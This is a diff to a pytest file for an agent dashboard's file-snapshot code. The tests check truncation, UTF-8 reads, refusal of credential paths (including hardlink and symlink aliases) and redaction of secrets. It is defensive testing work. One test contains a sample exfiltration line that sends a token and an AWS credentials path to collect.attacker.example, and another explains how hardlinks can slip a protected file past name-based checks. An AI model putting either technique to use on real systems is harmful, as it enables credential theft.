@@ -2,7 +2,8 @@
 
 Covers:
   * ``_truncate_snapshot`` — caps content at 200KB.
-  * ``_safe_read_snapshot`` — reads through validate_file_path; rejects sensitive paths.
+  * ``_safe_read_snapshot`` — reads through the descriptor gate; rejects sensitive
+    paths and hardlink/symlink aliases of them.
   * ``_snapshot_write_target`` — captures before-content for write tools only.
   * ``_flush_file_changes`` — dedups, scrubs credentials, attaches to last assistant message
     or creates a synthetic one when the turn aborts before any assistant text.
@@ -14,14 +15,16 @@ touching the live ACP runtime — every test stays in pure-Python land.
 
 from __future__ import annotations
 
+import os
 import shutil
 import tempfile
 from pathlib import Path
 from unittest.mock import MagicMock, patch
 
 import pytest
-from tmpdir_helpers import short_tmp_base
+from tmpdir_helpers import SHORT_TMP_PREFIX, short_tmp_base
 
+from conftest import requires_symlinks
 from kiro_crew.dashboard.chat_runner import (
     _MAX_SNAPSHOT,
     _flush_file_changes,
@@ -43,7 +46,7 @@ def short_tmp_dir():
     the nine inline calls this replaces each leaked a directory that survived the
     run; ``/tmp`` is not swept per-run the way pytest's own basetemp is.
     """
-    base = Path(tempfile.mkdtemp(dir=short_tmp_base()))
+    base = Path(tempfile.mkdtemp(prefix=SHORT_TMP_PREFIX + "snap-", dir=short_tmp_base()))
     try:
         yield base
     finally:
@@ -55,26 +58,34 @@ def short_tmp_dir():
 
 class TestTruncateSnapshot:
     def test_below_cap_passes_through(self):
-        assert _truncate_snapshot("hello world") == "hello world"
+        assert _truncate_snapshot("hello world").content == "hello world"
 
     def test_empty_string_passes_through(self):
-        assert _truncate_snapshot("") == ""
+        assert _truncate_snapshot("").content == ""
 
     def test_exactly_at_cap_not_truncated(self):
         content = "a" * _MAX_SNAPSHOT
-        assert _truncate_snapshot(content) == content
+        assert _truncate_snapshot(content).content == content
 
     def test_above_cap_truncated_with_marker(self):
         content = "a" * (_MAX_SNAPSHOT + 100)
         out = _truncate_snapshot(content)
         # Original prefix preserved, marker appended.
-        assert out.startswith("a" * _MAX_SNAPSHOT)
-        assert "(truncated at" in out
-        assert str(_MAX_SNAPSHOT) in out
+        assert out.content.startswith("a" * _MAX_SNAPSHOT)
+        assert "(truncated at" in out.content
+        assert str(_MAX_SNAPSHOT) in out.content
+
+    @pytest.mark.parametrize(
+        ("length", "truncated"),
+        [(_MAX_SNAPSHOT - 1, False), (_MAX_SNAPSHOT, False), (_MAX_SNAPSHOT + 1, True)],
+    )
+    def test_reports_truncation_at_boundary(self, length: int, truncated: bool):
+        snapshot = _truncate_snapshot("é" * length)
+        assert snapshot.truncated is truncated
 
     def test_truncation_idempotent_on_already_short_content(self):
         out = _truncate_snapshot("short")
-        assert _truncate_snapshot(out) == "short"
+        assert _truncate_snapshot(out.content).content == "short"
 
 
 # ── _safe_read_snapshot ─────────────────────────────────────────────────────
@@ -84,16 +95,40 @@ class TestSafeReadSnapshot:
     def test_reads_normal_file(self, tmp_path: Path):
         f = tmp_path / "file.txt"
         f.write_text("hello\nworld\n")
-        assert _safe_read_snapshot(str(f)) == "hello\nworld\n"
+        snapshot = _safe_read_snapshot(str(f))
+        assert snapshot is not None
+        assert snapshot.content == "hello\nworld\n"
 
-    def test_reads_with_explicit_utf8_encoding(self, tmp_path: Path):
+    def test_reads_utf8_regardless_of_locale(self, tmp_path: Path, monkeypatch):
+        # Git and agent-authored files are UTF-8 whatever the host's preferred
+        # code page says; the read must not consult the locale at all.
         f = tmp_path / "unicode.txt"
         f.write_text("こんにちは", encoding="utf-8")
+        import locale
 
-        with patch.object(Path, "read_text", return_value="こんにちは") as read_text:
-            assert _safe_read_snapshot(str(f)) == "こんにちは"
+        monkeypatch.setattr(locale, "getpreferredencoding", lambda *_a, **_k: "cp1252")
+        snapshot = _safe_read_snapshot(str(f))
+        assert snapshot is not None
+        assert snapshot.content == "こんにちは"
 
-        read_text.assert_called_once_with(encoding="utf-8", errors="replace")
+    def test_normalizes_newlines_like_the_text_mode_read_it_replaces(self, tmp_path: Path):
+        # The strReplace "before" is a text-mode read; a CRLF "after" that kept
+        # its \r would diff every unchanged line as modified.
+        f = tmp_path / "crlf.txt"
+        f.write_bytes(b"one\r\ntwo\rthree\r\n")
+        snapshot = _safe_read_snapshot(str(f))
+        assert snapshot is not None
+        assert snapshot.content == "one\ntwo\nthree\n"
+
+    def test_reads_through_the_descriptor_gate_not_by_name(self, tmp_path: Path):
+        # The bytes served must come from the descriptor the gate validated, so
+        # a by-name re-open after validation is exactly what must NOT happen.
+        f = tmp_path / "file.txt"
+        f.write_text("hello\n")
+        with patch.object(Path, "read_text", side_effect=AssertionError("re-opened by name")):
+            snapshot = _safe_read_snapshot(str(f))
+        assert snapshot is not None
+        assert snapshot.content == "hello\n"
 
     def test_returns_none_for_missing_file(self, tmp_path: Path):
         assert _safe_read_snapshot(str(tmp_path / "ghost")) is None
@@ -111,12 +146,68 @@ class TestSafeReadSnapshot:
         assert _safe_read_snapshot("~/.aws/credentials") is None
         assert _safe_read_snapshot("~/.ssh/id_rsa") is None
 
+    def test_withholds_a_hardlink_alias_of_a_protected_file(self, tmp_path: Path, monkeypatch):
+        """A hardlink alias shares its target's inode but carries its own innocent
+        name: ``realpath`` yields the alias, ``is_symlink()`` is False, and every
+        name-based check passes while the bytes belong to ``~/.aws/credentials``.
+        ``st_nlink`` is the only signal, and only an open descriptor exposes it —
+        so the read has to go through the descriptor gate, not re-open by name.
+        """
+        # Path.home() reads USERPROFILE on Windows and never HOME; pin both.
+        monkeypatch.setenv("HOME", str(tmp_path))
+        monkeypatch.setenv("USERPROFILE", str(tmp_path))
+        from kiro_crew.security import is_sensitive_path
+
+        secret = tmp_path / ".aws" / "credentials"
+        secret.parent.mkdir()
+        secret.write_text("aws_secret_access_key = SHOULD-NOT-APPEAR\n", encoding="utf-8")
+        assert is_sensitive_path(str(secret)), "precondition: the target is protected"
+        assert _safe_read_snapshot(str(secret)) is None, "precondition: the name is refused"
+
+        alias = tmp_path / "project" / "notes.md"
+        alias.parent.mkdir()
+        try:
+            os.link(secret, alias)
+        except (OSError, NotImplementedError) as exc:  # pragma: no cover - host capability
+            pytest.skip(f"filesystem does not support hardlinks: {exc}")
+        if alias.stat().st_nlink < 2:  # pragma: no cover - host capability
+            pytest.skip("filesystem did not create a second link")
+
+        assert _safe_read_snapshot(str(alias)) is None
+
+    @requires_symlinks
+    def test_withholds_a_symlink_to_a_protected_file(self, tmp_path: Path, monkeypatch):
+        # The link is refused at the open (``O_NOFOLLOW`` / no-reparse), before
+        # any name-based resolution could launder it into an innocent path.
+        # Path.home() reads USERPROFILE on Windows and never HOME; pin both.
+        monkeypatch.setenv("HOME", str(tmp_path))
+        monkeypatch.setenv("USERPROFILE", str(tmp_path))
+        secret = tmp_path / ".aws" / "credentials"
+        secret.parent.mkdir()
+        secret.write_text("SHOULD-NOT-APPEAR\n", encoding="utf-8")
+        link = tmp_path / "project" / "notes.md"
+        link.parent.mkdir()
+        link.symlink_to(secret)
+        assert _safe_read_snapshot(str(link)) is None
+
     def test_truncates_large_file(self, tmp_path: Path):
         big = tmp_path / "big.txt"
         big.write_text("x" * (_MAX_SNAPSHOT + 50))
         out = _safe_read_snapshot(str(big))
         assert out is not None
-        assert "(truncated at" in out
+        assert "(truncated at" in out.content
+        assert out.truncated is True
+
+    def test_truncates_a_large_multibyte_file_with_the_marker(self, tmp_path: Path):
+        # Four-byte code points: the byte cap must still leave MORE than the
+        # character cap, or a file just over the cap would lose its marker.
+        big = tmp_path / "big.txt"
+        big.write_text("\U0001f600" * (_MAX_SNAPSHOT + 1), encoding="utf-8")
+        out = _safe_read_snapshot(str(big))
+        assert out is not None
+        assert out.content.startswith("\U0001f600" * _MAX_SNAPSHOT)
+        assert "(truncated at" in out.content
+        assert out.truncated is True
 
     def test_replaces_undecodable_bytes(self, tmp_path: Path):
         # errors="replace" is used so binary garbage doesn't crash the read.
@@ -124,7 +215,7 @@ class TestSafeReadSnapshot:
         f.write_bytes(b"hello\xff\xfeworld")
         out = _safe_read_snapshot(str(f))
         assert out is not None
-        assert "hello" in out and "world" in out
+        assert "hello" in out.content and "world" in out.content
 
 
 # ── _snapshot_write_target ─────────────────────────────────────────────────
@@ -155,7 +246,7 @@ class TestSnapshotWriteTarget:
         # File doesn't exist yet — chip should still surface with empty before.
         target = tmp_path / "new.txt"
         out = _snapshot_write_target({"command": "create", "path": str(target)})
-        assert out == {"path": str(target), "content": ""}
+        assert out == {"path": str(target), "content": "", "truncated": False}
 
     def test_str_replace_on_existing_file_captures_content(self, tmp_path: Path):
         f = tmp_path / "code.py"
@@ -218,6 +309,43 @@ class TestFlushFileChanges:
         assert meta["file_changes"][0]["after"] == "after\n"
         # Slot's accumulator is reset for the next turn.
         assert slot._file_changes == []
+
+    @pytest.mark.parametrize(
+        ("before_length", "after_length"),
+        [(_MAX_SNAPSHOT + 1, 1), (1, _MAX_SNAPSHOT + 1), (_MAX_SNAPSHOT + 1, _MAX_SNAPSHOT + 2)],
+    )
+    def test_truncated_payload_reports_the_snapshot_limit(
+        self, tmp_path: Path, before_length: int, after_length: int
+    ) -> None:
+        target = tmp_path / "large.txt"
+        target.write_text("a" * after_length)
+        captured = _snapshot_write_target(
+            {"command": "create", "path": str(target)},
+            diff_old_text="é" * before_length,
+        )
+        assert captured is not None
+        slot = _make_slot_with_assistant_message()
+        slot._file_changes = [captured]
+        _flush_file_changes(slot)
+        change = slot.messages[-1]["meta"]["file_changes"][0]
+        assert change["truncated"] is True
+        assert change["snapshot_limit_chars"] == _MAX_SNAPSHOT
+
+    def test_untruncated_payload_keeps_the_legacy_shape(self, tmp_path: Path) -> None:
+        target = tmp_path / "small.txt"
+        target.write_text("after")
+        captured = _snapshot_write_target(
+            {"command": "create", "path": str(target)}, diff_old_text="before"
+        )
+        assert captured is not None
+        slot = _make_slot_with_assistant_message()
+        slot._file_changes = [captured]
+        _flush_file_changes(slot)
+        assert slot.messages[-1]["meta"]["file_changes"][0] == {
+            "path": str(target),
+            "before": "before",
+            "after": "after",
+        }
 
     def test_dedup_keeps_first_before(self, short_tmp_dir: Path):
         d = short_tmp_dir
@@ -802,6 +930,34 @@ class TestContentBlockRedactionAndTruncation:
         changes = meta["file_changes"]
         # The AKIA key in before must be scrubbed
         assert "AKIAIOSFODNN7EXAMPLE" not in changes[0]["before"]
+
+    def test_chip_scrub_is_the_exfil_first_composition(self, short_tmp_dir: Path):
+        """A long-query exfil URL in chip content loses its WHOLE url.
+
+        `redact_exfiltration_urls` classifies partly by query length and
+        replaces the entire url; a hand-sequenced creds-first pair here would
+        shorten `?token=<long>` first and defeat it, leaking the destination
+        and payload parameters into the chip diff (the same seam
+        `discover.py`'s TestRedactExternalLayerOrder pins). The scrub must
+        stay the canonical `security.redact()` composition.
+        """
+        d = short_tmp_dir
+        f = d / "notes.md"
+        f.write_text("clean after\n")
+        exfil = (
+            "fetch https://collect.attacker.example/?token="
+            + "aB3" * 70
+            + "&host=corp-laptop&path=/home/alice/.aws/credentials\n"
+        )
+        slot = _make_slot_with_assistant_message()
+        slot._file_changes = [{"path": str(f), "content": exfil}]
+        _flush_file_changes(slot)
+        changes = slot.messages[-1]["meta"]["file_changes"]
+        before = changes[0]["before"]
+        assert "corp-laptop" not in before
+        assert "/home/alice/.aws/credentials" not in before
+        assert "?token=" not in before
+        assert "[REDACTED: suspicious URL to collect.attacker.example]" in before
 
     def test_sensitive_path_refused_even_with_diff_old_text(self):
         """Even when diff_old_text is provided, sensitive paths are refused
